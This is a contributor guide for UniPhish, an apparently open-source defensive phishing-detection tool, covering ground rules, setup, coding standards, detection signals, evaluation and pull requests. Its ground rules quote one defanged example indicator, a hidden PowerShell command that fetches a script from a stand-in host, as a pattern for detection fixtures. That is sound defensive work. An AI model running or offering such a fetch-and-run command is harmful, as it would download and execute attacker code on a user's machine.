# Contributing to UniPhish

Thank you for helping. UniPhish is a **defensive** security tool, so contributions are
welcome in proportion to how well they keep it correct, explainable and safe. This guide is
the short version; the binding engineering rules are in
[`docs/dev/build-contract.md`](docs/dev/build-contract.md).

## Ground rules

1. **Defensive only.** No working malware, real phishing kits, live exfiltration endpoints,
   real credentials or real victims' data, ever, in code, fixtures, docs or issues. Sample
   content must be synthetic and inert: reserved domains (`.test`, `.example`, `.invalid`,
   `example.com`) and obviously fake look-alikes. Kit fixtures hold *indicators* (patterns),
   not functional payloads, for example `powershell -w hidden -c "iwr hxxp://evil.test/a.ps1"`.
2. **Honesty over polish.** Report what a change does to measured quality, including when it
   is worse. Never present a heuristic weight as a measured probability. Claims in docs must
   match the code; if you cannot verify it, say so.
3. **Treat all analysed input as hostile.** Bound sizes, never execute or evaluate content,
   never open paths taken from input, parse XML/SVG with `defusedxml`, cap archive
   extraction, and make every regex that touches attacker text ReDoS-safe.
4. **Offline first.** Nothing touches the network unless `ctx.online` is true, and then only
   through `uniphish.core.net` (the SSRF-safe gateway). Never use raw `requests` or `urllib`.
5. **Explainable.** Every point of risk must be a `Signal` with a readable title and detail.

## Getting set up

```bash
git clone https://github.com/jeevithg090/UniPhish.git && cd UniPhish
python3 -m venv .venv && source .venv/bin/activate
pip install -e '.[dev]'                  # runtime extras + pytest, hypothesis, respx, ruff
# only if you work on web/ or extension/: Node 18+ and npm
```

Run things:

```bash
python -m pytest tests/<area> -q          # tests are offline; network is blocked by tests/conftest.py
ruff check . && ruff format --check .     # lint + format (line length 100; rules E,F,W,I,B,UP,SIM,S)
cd extension && node --test test/*.test.js  # extension tests
cd web && npm ci && npm run lint && npm test  # console lint (Biome) + tests; `npm run build` type-checks and builds
python scripts/smoke_platform.py          # end-to-end canonical cases, non-zero exit on failure
```

CI (`.github/workflows/ci.yml`) runs the same lint, format, test and build steps on every
pull request; run the relevant ones locally first (`make check`).

## Coding standards

* Python 3.10+, `from __future__ import annotations`, full type hints, a module docstring
  that explains **why** the module exists, docstrings on public functions.
* `logging.getLogger("uniphish.<area>")`, never `print` in library code.
* Deterministic, pure functions where possible; precompile regexes at import time.
* Data lives in `uniphish/assets/` as YAML or JSON and is loaded with
  `uniphish.assets.load_yaml(...)`; do not hard-code brand lists, TLD risk, lexicons or rules
  in Python.
* Keep modules cohesive (roughly under 600 lines) and split when larger.
* Tests: thorough, fast (typically under 2 s per file), offline. Use `httpx.MockTransport`,
  `respx` or the `core.net` resolver hook; put fixtures under `tests/<area>/fixtures/`; use
  Hypothesis where it adds value (parsers, normalisers). Test files use
  `--import-mode=importlib` and there are no `__init__.py` files under `tests/`.

## Common contributions

### Add or tune a detection signal

1. Put it in the owning analyzer under `uniphish/analyzers/` and **declare it in the
   analyzer's `signals` dict** (id to title). The catalog is generated from that dict.
2. Follow the conventions: id lowercase dotted and namespaced (`page.*`, `kit.*`, `email.*`
   ...); title 70 characters or fewer that reads well after "Flagged because:"; detail with
   the concrete specifics in plain language; one `category` (signals in the same category are
   damped when fused); `mitre=[...]` ids from `uniphish/core/mitre.py` only where they really
   apply; `evidence={...}` and a `span` when you have one.
3. Choose the weight on the log-odds scale: +6 to +8 decisive, +3 to +5 strong, +1 to +2
   moderate, +0.2 to +1 weak, -1 to -4 legitimacy. Justify it in the PR (what evidence, how
   often it occurs in benign traffic).
4. **Check false positives first.** A new signal that fires on legitimate content is worse than
   a missed detection. Add a benign counter-example to your tests.
5. Add tests, then regenerate [`docs/detections.md`](docs/detections.md) (see below).

### Add data (brands, lures, TLDs, LOTS hosts, kit signatures)

Edit the YAML in `uniphish/assets/` and note provenance in `uniphish/assets/README.md`. For
brands, include official, login, CDN and user-content domains (user-content domains are what
stop a brand's own hosting from granting legitimacy to attacker pages). For kit signatures,
describe indicators, keep regexes bounded (the loader's linter rejects unbounded repeats,
back-references and nested variable repeats), and add a positive and a negative test. Lures
in lower-resource languages without native-speaker review are flagged in the assets README;
native-speaker review is a very welcome contribution. If you change data the extension
bundles, run `python extension/tools/build_data.py` (and `--check` to verify).

### Add an analyzer

See the [architecture](docs/architecture.md#extending-uniphish) and the example in
[`docs/dev/build-contract.md`](docs/dev/build-contract.md#5-writing-an-analyzer): subclass
`Analyzer`, `@register`, declare `signals`, return an `AnalyzerResult`, add the module to
`BUILTIN_MODULES`. Analyzers must be fault-tolerant (the engine isolates failures, but do not
rely on that) and should not need the network unless `requires_online` is set.

### Evaluation changes

If your change plausibly moves detection quality, run the benchmark before and after:

```bash
python -m uniphish.eval.benchmark --dataset urls smishing injection email
python -m uniphish.eval.redteam --n 100
```

and put the deltas in the PR. The datasets are synthetic and small; say so rather than
claiming a general improvement. If you add data to the benchmark, keep it inert and keep
the benign set adversarial for false positives.

### Surfaces (extension, bot, console)

* **Extension**: it deliberately mirrors the Python URL rules, CNN and fusion. After changing
  the Python side, regenerate and re-test: `python extension/tools/build_data.py`,
  `cd extension && node --test test/`. If the two engines must differ, document the deviation
  in `extension/README.md`.
* **Bot**: logic lives in `bot/reply.py` (no Telegram dependency); keep links defanged and
  never echo user text.
* **Console**: `web/` is React + TypeScript; it must not add external requests or telemetry.

## Regenerating generated docs

`docs/detections.md` is generated from `uniphish.core.analyzer.signal_catalog()` after the
built-in analyzers load. Do not hand-edit it. A minimal regeneration check:

```bash
python - <<'EOF'
from uniphish.analyzers import load_builtin_analyzers
load_builtin_analyzers()
from uniphish.core.analyzer import signal_catalog
print(len(signal_catalog()), "signals")        # compare with the count at the top of docs/detections.md
EOF
uniphish catalog --json > /tmp/catalog.json    # machine-readable catalog for diffing
```

## Pull requests

* One logical change per PR; explain **why**, not just what.
* Include tests that fail without your change. Include a benign counter-example for new
  detections.
* State the effect on measured quality, or say it was not measured.
* Keep user-facing text and signal titles free of hype and plain enough for a non-expert.
* Do not commit secrets, large binaries or real phishing samples. Model weights and
  Unicode tables are generated assets; do not edit them by hand
  (`scripts/gen_unicode_data.py` regenerates the Unicode tables).
* Security-relevant behaviour (SSRF gateway, parsers, auth, sandbox, exporters) gets extra
  review. If you believe you have found a vulnerability, do **not** open a public issue;
  follow [SECURITY.md](SECURITY.md).

## Reporting false positives and false negatives

Open an issue with the (defanged) artifact, the verdict (`uniphish scan ... --json`), and what
you expected. For URLs, include whether a legitimate site was flagged: false positives on real
sites are the most damaging failure for a tool like this and are triaged first. Do not attach
live malware or real personal data; redact or replace with reserved domains.

## Code of conduct

Be respectful and constructive. Assume good faith, critique code and ideas rather than people,
and keep discussion of attacks at the level needed to build defences.

## License

By contributing you agree that your contributions are licensed under the MIT License in
[LICENSE](LICENSE).
